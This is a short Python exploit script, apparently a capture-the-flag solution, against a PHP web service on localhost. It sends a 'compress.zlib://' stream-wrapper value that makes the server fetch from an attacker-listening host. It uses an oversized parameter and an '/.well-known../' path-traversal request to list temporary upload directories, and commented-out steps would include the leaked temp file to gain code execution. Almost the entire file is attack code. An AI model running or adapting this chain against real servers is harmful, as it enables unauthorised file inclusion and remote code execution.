import requests
from pwn import *
import re 

l = listen(5437)

for _ in range(100): 
    url = "http://localhost:7777"
    r = requests.post(
        f"{url}",
        data={
            "name": "a" * 8050, 
            "file": "compress.zlib://http://172.30.98.235:5487"
        }
    )
    dirname = r.text[r.text.find("files"): r.text.find("files") + 70]
    print("[DEBUG]:", dirname)

    # get filename
    r2 = requests.get(f"{url}/.well-known../" + str(dirname) + "/")
    print((r2.text))
    # tmpname = "php" + re.findall(">php(.*)<\/a",r2.text)[0]
    # print("[DEBUG]:", tmpname)

    # # file_get_contents and include tmp file
    # exp_file = dirname + "/" + tmpname
    # print("[DEBUG]:", exp_file)
    # r3 = requests.post("http://localhost:7777/", data={'file':exp_file})
    # print(r3.status_code,r3.text)
    # if "wtf" in r3.text:
    #     break 